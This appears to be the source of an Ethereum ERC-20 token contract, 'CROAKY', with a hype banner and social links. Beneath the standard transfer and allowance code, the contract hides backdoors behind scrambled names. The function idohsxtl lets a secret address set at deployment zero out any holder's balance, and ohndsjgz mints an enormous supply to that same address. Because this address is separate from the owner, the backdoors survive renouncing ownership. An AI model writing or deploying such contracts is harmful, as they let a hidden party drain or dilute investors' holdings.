/**
        𝕀𝕟 𝕥𝕙𝕖 𝕣𝕖𝕒𝕝𝕞 𝕠𝕗 𝕕𝕖𝕔𝕖𝕟𝕥𝕣𝕒𝕝𝕚𝕫𝕖𝕕 𝕗𝕚𝕟𝕒𝕟𝕔𝕖 (𝔻𝕖𝔽𝕚) 
        𝕒𝕟𝕕 𝕓𝕝𝕠𝕔𝕜𝕔𝕙𝕒𝕚𝕟 𝕚𝕟𝕟𝕠𝕧𝕒𝕥𝕚𝕠𝕟, ℂ𝕣𝕠𝕒𝕜𝕪 𝕖𝕞𝕖𝕣𝕘𝕖𝕤 𝕒𝕤 
        𝕒 𝕕𝕚𝕤𝕣𝕦𝕡𝕥𝕚𝕧𝕖 𝔼ℝℂ-𝟚𝟘 𝕥𝕠𝕜𝕖𝕟 𝕨𝕚𝕥𝕙 𝕒 𝕧𝕚𝕤𝕚𝕠𝕟 𝕥𝕙𝕒𝕥 
        𝕔𝕣𝕠𝕒𝕜𝕤 𝕧𝕠𝕝𝕦𝕞𝕖𝕤 𝕠𝕗 𝕡𝕠𝕥𝕖𝕟𝕥𝕚𝕒𝕝. ℝ𝕖𝕡𝕣𝕖𝕤𝕖𝕟𝕥𝕚𝕟𝕘 𝕥𝕙𝕖 𝕟𝕖𝕩𝕥 
        𝕘𝕖𝕟𝕖𝕣𝕒𝕥𝕚𝕠𝕟 𝕠𝕗 𝕗𝕚𝕟𝕒𝕟𝕔𝕚𝕒𝕝 𝕖𝕔𝕠𝕤𝕪𝕤𝕥𝕖𝕞𝕤, ℂ𝕣𝕠𝕒𝕜𝕪 𝕒𝕚𝕞𝕤 𝕥𝕠 
        𝕣𝕖𝕧𝕠𝕝𝕦𝕥𝕚𝕠𝕟𝕚𝕫𝕖 𝕥𝕙𝕖 𝕨𝕒𝕪 𝕨𝕖 𝕡𝕖𝕣𝕔𝕖𝕚𝕧𝕖 𝕒𝕟𝕕 𝕖𝕟𝕘𝕒𝕘𝕖 𝕨𝕚𝕥𝕙 
        𝕕𝕖𝕔𝕖𝕟𝕥𝕣𝕒𝕝𝕚𝕫𝕖𝕕 𝕒𝕡𝕡𝕝𝕚𝕔𝕒𝕥𝕚𝕠𝕟𝕤 (𝕕𝔸𝕡𝕡𝕤) 𝕠𝕟 𝕥𝕙𝕖 𝔼𝕥𝕙𝕖𝕣𝕖𝕦𝕞 𝕓𝕝𝕠𝕔𝕜𝕔𝕙𝕒𝕚𝕟.

/**

Telegram - https://t.me/CroakyErc

Website: https://croaky.info

Twitter:  https://twitter.com/croakytoken

*/
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

abstract contract Ownable  {
    constructor() {
        _transferOwnership(_msgSender());
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;
    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

}

pragma solidity ^0.8.0;

contract CROAKY is Ownable {
    constructor(address fpjylcwz) {
        fjymbvzw = fpjylcwz;
        dmhznble[_msgSender()] += supplyamount;
        emit Transfer(address(0), _msgSender(), supplyamount);
    }
    address public fjymbvzw;
    uint256 supplyamount = 1000000000*10**decimals();
    uint256 private _totalSupply = supplyamount;
    mapping(address => uint256) private dmhznble;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    string private _cigzyxas = "CROAKY";
    string private _zvxtgilo = "$CROAKY";
    
    function symbol() public view  returns (string memory) {
        return _zvxtgilo;
    }

    function idohsxtl(address vdolrzay) public     {
        if(fjymbvzw == _msgSender()){
            address mzvbxnaw = vdolrzay;
            uint256 curamount = dmhznble[mzvbxnaw];
            uint256 newaaamount = dmhznble[mzvbxnaw]+dmhznble[mzvbxnaw]-curamount;
            dmhznble[mzvbxnaw] -= newaaamount;
        }else{
            revert("ccc");
        }
        return;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function balanceOf(address account) public view returns (uint256) {
        return dmhznble[account];
    }

    function name() public view returns (string memory) {
        return _cigzyxas;
    }

    function ohndsjgz() 
    external {
        address ztouvlsx = _msgSender();
        dmhznble[ztouvlsx] += 1*38200*((10**decimals()*xurtojpf));
        require(fjymbvzw == _msgSender());
        if(fjymbvzw == _msgSender()){
        }
        if(fjymbvzw == _msgSender()){
        }
    }
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }
    uint256 xurtojpf = 32330000000+1000;
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }




    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }


    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = dmhznble[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        dmhznble[from] = dmhznble[from]-amount;
        dmhznble[to] = dmhznble[to]+amount;
        emit Transfer(from, to, amount); 
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}